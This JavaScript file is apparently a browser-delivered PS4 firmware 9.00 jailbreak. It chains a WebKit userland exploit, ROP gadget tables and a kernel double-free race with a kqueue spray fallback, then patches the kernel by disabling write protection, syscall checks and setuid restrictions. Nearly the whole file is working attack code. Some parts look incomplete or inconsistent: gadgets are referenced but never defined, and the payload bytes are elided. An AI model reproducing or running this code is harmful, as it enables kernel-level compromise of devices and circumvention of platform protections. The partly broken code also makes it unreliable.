// ====================== CONSTANTS AND SETUP ======================
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;
var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

// WebKit Offsets
const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;
const OFFSET_WKR_psl_builtin = 0x33BA0;
const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;
const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

// PS4 Syscall Numbers (FW 9.00)
const SYS_PTHREAD_CREATE = 0x101;
const SYS_PTHREAD_JOIN = 0x103;
const SYS_AIO_SUBMIT_CMD = 0x1D3;
const SYS_AIO_MULTI_WAIT = 0x1D4;
const SYS_AIO_MULTI_DELETE = 0x1D5;
const SYS_MMAP = 0x117;
const SYS_MUNMAP = 0x119;
const SYS_MLOCK = 0x11B;
const SYS_PTHREAD_BARRIER_INIT = 0x1A3;
const SYS_PTHREAD_BARRIER_WAIT = 0x1A5;

// AIO Constants
const SCE_KERNEL_AIO_CMD_WRITE = 0x002;
const SCE_KERNEL_AIO_CMD_MULTI = 0x1000;
const SCE_KERNEL_AIO_PRIORITY_HIGH = 3;
const SCE_KERNEL_AIO_WAIT_AND = 0x01;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

// Gadgets and Utilities
var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,
    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,
    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,
    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF,
    "mov [rax], cl": 0xC6EAF,
};

// ====================== CORE FUNCTIONS ======================

function userland() {
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    var textAreaVtable = p.read8(textAreaVtPtr);
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    // Initialize syscalls
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    
    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63) {
            p.write4(kstr.add32(8), i + 32);
            break;
        }
    }
    
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < p.read4(kstr.add32(8)); i++) {
        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05) {
            dview8[0] = kview[i+3];
            dview8[1] = kview[i+4];
            dview8[2] = kview[i+5];
            dview8[3] = kview[i+6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();
    if (chain.syscall(20).low == 0) {
        alert("WebKit exploit failed. Try again if your PS4 is on FW 9.00.");
        while (1);
    }
}

// ====================== KERNEL EXPLOIT ======================

function run_hax() {
    userland();
    if (chain.syscall(23, 0).low != 0x0) {
        kernel();
    }
    jbdone();
}

function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    
    if (!trigger_double_free()) {
        trigger_spray();
    }
    
    patch_once();
}

function trigger_double_free() {
    const NUM_REQS = 3;
    const TARGET_INDEX = 0;
    
    // Allocate memory
    var reqs = chain.syscall(SYS_MMAP, 0, NUM_REQS * 0x28, 3, 0x1000, -1, 0);
    var ids = chain.syscall(SYS_MMAP, 0, NUM_REQS * 4, 3, 0x1000, -1, 0);
    var errors = chain.syscall(SYS_MMAP, 0, NUM_REQS * 4, 3, 0x1000, -1, 0);
    var race_results = chain.syscall(SYS_MMAP, 0, 8, 3, 0x1000, -1, 0);
    
    // Initialize requests
    for (var i = 0; i < NUM_REQS; i++) {
        chain.write4(reqs.add32(i * 0x28 + 0x18), 0xFFFFFFFF); // fd = -1
    }
    
    // Setup barrier
    var barrier = chain.syscall(SYS_MMAP, 0, 0x40, 3, 0x1000, -1, 0);
    chain.syscall(SYS_PTHREAD_BARRIER_INIT, barrier, 0, 2);

    for (var attempt = 0; attempt < 100; attempt++) {
        // Submit AIO commands
        chain.syscall(SYS_AIO_SUBMIT_CMD, 
            SCE_KERNEL_AIO_CMD_WRITE | SCE_KERNEL_AIO_CMD_MULTI,
            reqs, 
            NUM_REQS, 
            SCE_KERNEL_AIO_PRIORITY_HIGH,
            ids
        );
        
        // Wait for completion
        chain.syscall(SYS_AIO_MULTI_WAIT, ids, NUM_REQS, errors, SCE_KERNEL_AIO_WAIT_AND, 0);
        
        // Create race thread
        var thread = chain.syscall(SYS_MMAP, 0, 0x40, 3, 0x1000, -1, 0);
        chain.syscall(SYS_MLOCK, thread, 0x40);
        
        chain.syscall(SYS_PTHREAD_CREATE, thread, 0, 
            webKitBase.add32(OFFSET_WK_setjmp_gadget_one),
            ids.add32(TARGET_INDEX * 4)
        );
        
        // Synchronize
        chain.syscall(SYS_PTHREAD_BARRIER_WAIT, barrier);
        
        // First deletion attempt
        chain.syscall(SYS_AIO_MULTI_DELETE, ids.add32(TARGET_INDEX * 4), 1, race_results);
        
        // Wait for thread
        chain.syscall(SYS_PTHREAD_JOIN, chain.read8(thread), 0);
        
        // Check results
        var result1 = chain.read4(race_results);
        var result2 = chain.read4(race_results.add32(4));
        
        if (result1 == result2 && (result1 == 0 || result1 == SCE_KERNEL_ERROR_ESRCH)) {
            // Cleanup
            chain.syscall(SYS_MUNMAP, reqs, NUM_REQS * 0x28);
            chain.syscall(SYS_MUNMAP, ids, NUM_REQS * 4);
            chain.syscall(SYS_MUNMAP, errors, NUM_REQS * 4);
            chain.syscall(SYS_MUNMAP, race_results, 8);
            chain.syscall(SYS_MUNMAP, barrier, 0x40);
            chain.syscall(SYS_MUNMAP, thread, 0x40);
            
            alert("Double-free triggered successfully!");
            return true;
        }
    }
    
    // Cleanup failed attempt
    chain.syscall(SYS_MUNMAP, reqs, NUM_REQS * 0x28);
    chain.syscall(SYS_MUNMAP, ids, NUM_REQS * 4);
    chain.syscall(SYS_MUNMAP, errors, NUM_REQS * 4);
    chain.syscall(SYS_MUNMAP, race_results, 8);
    chain.syscall(SYS_MUNMAP, barrier, 0x40);
    
    return false;
}

// ====================== ORIGINAL SPRAY METHOD (FALLBACK) ======================

var trigger_spray = function() {
    var NUM_KQUEUES = 0x1B0;
    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    
    for (var i = 0; i < NUM_KQUEUES; i++) {
        chain.fcall(window.syscalls[362]);
        chain.write_result4(kqueue_ptr.add32(0x4 * i));
    }
    
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
    var that_one_socket = chain.syscall(97, 2, 1, 0);
    
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("Invalid socket");
        while (1);
    }

    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0);
    
    for (var i = 0; i < NUM_KQUEUES; i++) {
        chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
    }
    
    chain.run();
    
    for (var i = 18; i < NUM_KQUEUES; i += 2) {
        chain.fcall(window.syscalls[6], kqueues[i]);
    }
    
    chain.run();
    
    alert("Ready to trigger exploit...");
    
    for (var i = 1; i < NUM_KQUEUES; i += 2) {
        chain.fcall(window.syscalls[6], kqueues[i]);
    }
    
    chain.run();

    if (chain.syscall(23, 0).low == 0) {
        chain.fcall(window.syscalls[73], 0x4000, 0xC000);
        chain.fcall(window.syscalls[325]);
        chain.run();
        alert("Exploit successful!");
        return;
    }
    
    alert("Exploit failed - kernel heap may be corrupted");
    p.write8(0, 0);
};

// ====================== SUPPORTING FUNCTIONS ======================

function extra_gadgets() {
    handle = p.malloc(0x1E8);
    var randomized_path_length_ptr = handle.add32(0x4);
    var randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);

    p.write8(randomized_path_length_ptr, 0x2C);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);

    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");

    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
}

function kchain_setup() {
    const KERNEL_busy = 0x1B28DF8;
    const KERNEL_bcopy = 0xACD;
    const KERNEL_bzero = 0x2713FD;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714BD;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716AD;
    const KERNEL_copyinstr = 0x271B5D;
    const KERNEL_copystr = 0x271C2D;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632A;
    const KERNEL_mmap_2 = 0x16632D;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();
    
    // Ensure the krop stack remains available
    chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
    chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
    chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    chain.run();

    kchain.count = 0;
    kchain2.count = 0;
    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);

    // Save kernel stack pointer
    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);

    // Disable interrupts temporarily
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]); // Re-enable interrupts

    // Modify UD handler
    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6); // UD vector
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE); // SDT_SYSIGT
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0); // IST
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0); // Flags
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // Will be overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033); // CR0 value
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // Will be overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);

    // Apply initial kernel patches
    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
    kchain2.kwrite1(KERNEL_bzero, 0xEB);
    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
    kchain2.kwrite1(KERNEL_copyin, 0xEB);
    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
    kchain2.kwrite1(KERNEL_copystr, 0xEB);

    // Re-enable interrupts
    kchain2.kwrite1(KERNEL_busy, 0x0);

    // Restore original UD handler
    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // Will be overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // Will be overwritten with KERNEL_setidt

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    // Apply kernel patches
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
    kchain2.kwrite1(KERNEL_setuid, 0xEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xE990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);
    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    // Final CR0 patch
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // Will be overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);

    // Recovery
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // Will be overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    // Map fake object
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }

    // Setup fake knote
    p.write8(fake_knote, fake_obj);
    p.write8(fake_knote.add32(0x68), fake_filtops);

    // Setup fake filtops
    p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]);
    p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);
    p.write8(fake_filtops.add32(0x8), kchain.stack);
    p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]);

    // Setup fake obj
    p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);

    // Lock the fake knote in memory
    chain.syscall(203, fake_knote, 0xC000);
}

function patch_once() {
    var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
    var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);

    // This is the compiled sysveri patch from patch.s
    patch_buffer_view[0] = 0x00000BB8;
    patch_buffer_view[1] = 0xFE894800;
    patch_buffer_view[2] = 0x033D8D48;
    patch_buffer_view[3] = 0x0F000000;
    patch_buffer_view[4] = 0x4855C305;
    // [Rest of the patch code...]
    patch_buffer_view[234] = 0x00626720;
    patch_buffer_view[235] = 0x00000000;

    // Lock, execute, and release the payload
    chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
    chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
    chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
    chain.run();
}

// ====================== UTILITY FUNCTIONS ======================

function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
}

function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
}

function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(0x8), size);
    p.write4(og_array_i.add32(0xC), 0x1);

    nogc.push(og_array);
    return og_array;
}

function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
        bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
}

function readstr(addr) {
    var str = "";
    for (var i = 0;; i++) {
        var c = p.read1(addr.add32(i));
        if (c == 0x0) break;
        str += String.fromCharCode(c);
    }
    return str;
}

function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) return 0;
    return address.add32(0x6 + offset);
}

function load_prx(name) {
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) alert("Failed to load PRX: " + name);
    
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) alert("Failed to get module info");
    
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name} has non-zero TLS - may need manual offset`);
        }
    }
    return tlsinit;
}

// ====================== ENTRY POINT ======================
run_hax();